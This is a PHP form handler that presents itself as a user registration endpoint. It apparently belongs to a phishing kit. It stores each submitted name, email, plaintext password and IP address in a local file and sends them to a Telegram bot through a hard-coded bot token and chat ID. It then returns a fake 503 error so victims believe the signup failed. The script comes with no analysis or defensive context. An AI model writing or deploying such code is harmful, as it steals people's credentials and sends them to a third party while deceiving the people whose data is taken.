<?php


if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
  exit;
}

$name  = trim($_POST['name'] ?? '');
$email = trim($_POST['email'] ?? '');
$pass  = $_POST['password'] ?? '';
$pass2 = $_POST['password_confirm'] ?? '';

if ($name === '' || $email === '' || $pass === '' || $pass !== $pass2) {
  http_response_code(400);
  exit;
}

$dir  = __DIR__ . '/data';
$file = $dir . '/users.txt';

if (!is_dir($dir)) {
  mkdir($dir, 0755, true);
}

$ip = $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';


file_put_contents(
  $file,
  date('c')." | $ip | $name | $email | $pass\n",
  FILE_APPEND | LOCK_EX
);


$token  = '8223983641:AAEnecKk0d5K1VHwk_aUlPzFlfldydToGOE';
$chatId = '7392247001';

$msg =
"Nuevo registro\n".
"IP: $ip\n".
"Nombre: $name\n".
"Email: $email\n".
"Password: $pass";

$url = "https://api.telegram.org/bot{$token}/sendMessage";
$post = http_build_query([
  'chat_id' => $chatId,
  'text' => $msg
]);

@file_get_contents($url, false, stream_context_create([
  'http' => [
    'method'  => 'POST',
    'header'  => "Content-type: application/x-www-form-urlencoded\r\n",
    'content' => $post,
    'timeout' => 10
  ]
]));


sleep(3);
http_response_code(503);
exit;
